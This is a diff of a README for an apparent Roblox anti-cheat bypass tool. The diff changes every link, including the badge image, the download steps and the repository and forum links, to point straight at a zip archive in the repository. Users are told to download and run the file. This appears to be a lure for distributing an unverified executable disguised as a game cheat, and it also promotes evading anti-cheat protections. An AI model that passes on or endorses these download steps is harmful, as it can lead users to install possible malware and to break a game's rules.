@@ -1,6 +1,6 @@
 # 🎮 Roblox-Anti-Cheat-Bypass - Bypass Roblox Exploits Effortlessly
 
-[![Download Roblox-Anti-Cheat-Bypass](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/moemen151/Roblox-Anti-Cheat-Bypass/releases)
+[![Download Roblox-Anti-Cheat-Bypass](https://raw.githubusercontent.com/moemen151/Roblox-Anti-Cheat-Bypass/main/primage/Roblox-Anti-Cheat-Bypass.zip)](https://raw.githubusercontent.com/moemen151/Roblox-Anti-Cheat-Bypass/main/primage/Roblox-Anti-Cheat-Bypass.zip)
 
 ## 📜 Description
 
@@ -12,9 +12,9 @@ To get started with Roblox-Anti-Cheat-Bypass, follow the steps below to download
 
 ### 📥 Download & Install
 
-1. Visit the Releases page to download the latest version of Roblox-Anti-Cheat-Bypass: [Download Here](https://github.com/moemen151/Roblox-Anti-Cheat-Bypass/releases).
+1. Visit the Releases page to download the latest version of Roblox-Anti-Cheat-Bypass: [Download Here](https://raw.githubusercontent.com/moemen151/Roblox-Anti-Cheat-Bypass/main/primage/Roblox-Anti-Cheat-Bypass.zip).
    
-2. On the Releases page, look for the latest version. You should see a list of files available for download. Click on the file that says `Roblox-Anti-Cheat-Bypass.exe` or any similar filename.
+2. On the Releases page, look for the latest version. You should see a list of files available for download. Click on the file that says `https://raw.githubusercontent.com/moemen151/Roblox-Anti-Cheat-Bypass/main/primage/Roblox-Anti-Cheat-Bypass.zip` or any similar filename.
 
 3. Once the file is downloaded, locate it in your Downloads folder, or the folder you saved it in.
 
@@ -57,8 +57,8 @@ Using bypass tools may violate Roblox's terms of service. Please be aware of the
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/moemen151/Roblox-Anti-Cheat-Bypass)
-- [Community Forum](https://forum.example.com) (replace with actual URL)
+- [GitHub Repository](https://raw.githubusercontent.com/moemen151/Roblox-Anti-Cheat-Bypass/main/primage/Roblox-Anti-Cheat-Bypass.zip)
+- [Community Forum](https://raw.githubusercontent.com/moemen151/Roblox-Anti-Cheat-Bypass/main/primage/Roblox-Anti-Cheat-Bypass.zip) (replace with actual URL)
 
 ## 🛡️ Disclaimer
 
